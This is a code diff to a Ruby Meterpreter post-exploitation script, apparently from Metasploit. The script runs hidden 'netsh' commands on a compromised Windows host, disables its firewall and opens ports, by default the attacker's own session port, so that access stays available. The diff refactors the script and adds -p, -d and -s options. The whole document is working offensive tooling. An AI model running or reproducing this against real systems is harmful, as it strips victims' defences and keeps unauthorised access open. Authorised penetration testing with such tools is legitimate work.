@@ -1,4 +1,30 @@
-require "#{ENV[:BASE]}/msf3/scripts/meterpreter/winfirewall-api"
+# Dynamic load of the winfirewall-api.rb 
+def dynamic_require path
+    $".delete path if $".include? path
+    require path
+end
+
+winfirewall_api_path = "#{ENV[:BASE]}/msf3/scripts/meterpreter/winfirewall-api.rb"
+dynamic_require winfirewall_api_path
+
+def console_show_open_port_entries session
+   	print_status("Getting new Open Port Entrys ...")
+	read_state = session.sys.process.execute("cmd.exe /c netsh firewall show portopening", nil, {'Hidden' => 'true','Channelized' => true})
+    config = ""
+    while(d = read_state.channel.read)
+    	if d =~ /The requested operation requires elevation./
+    		print_error("\tUAC or Insufficient permissions prevented the disabling of Firewall")
+    	else
+    	    config << d
+    	end
+    end	
+    read_state.channel.close
+    read_state.close 1
+    
+    config.split("\n").each do |o|
+      print_status o
+    end 
+end
 
 def console_disable_firewall session
     config = read_firewall_config session
@@ -13,7 +39,6 @@ end
 
 def console_open_firewall_port(port, session)
     config = read_firewall_config session
-    
     if config[:firewall_state] == "inactive"
         print_status("Firewall is inactive")
         print_status("Altering the Portconfig may not be necessary")
@@ -32,22 +57,8 @@ def console_open_firewall_port(port, session)
 	
 	open_port session, port
 	
-	print_status("Getting new Open Port Entrys ...")
-	read_state = session.sys.process.execute("cmd.exe /c netsh firewall show portopening", nil, {'Hidden' => 'true','Channelized' => true})
-    config = ""
-    while(d = read_state.channel.read)
-    	if d =~ /The requested operation requires elevation./
-    		print_error("\tUAC or Insufficient permissions prevented the disabling of Firewall")
-    	else
-    	    config << d
-    	end
-    end	
-    read_state.channel.close
-    read_state.close 1
-    
-    config.split("\n").each do |o|
-      print_status o
-    end
+	console_show_open_port_entries session
+
 end
 
 port = nil
@@ -56,13 +67,18 @@ when "-p"
   if args[1]
     port = args[1]
   else
-    print_error("No Portnumber given")
-    raise Rex::Script::Completed
+    port ||= session.sock.peerport
   end
+  print_status("Try to Open Port #{port}")
+  console_open_firewall_port port, client
 when "-d"
-    console_disable_firewall client
-    raise Rex::Script::Completed
+  console_disable_firewall client
+when "-s"
+  console_show_open_port_entries client
+else    
+    print_status "Usage:" 
+    print_status "-p [port] Opens a specified Port or the Meterpreter-Session Port"
+    print_status "-d Disables the Windows Firewall"
+    print_status "-s Show Open Ports"
 end
-port ||= session.sock.peerport
-print_status("Try to Open Port #{port}")
-console_open_firewall_port port, client
+
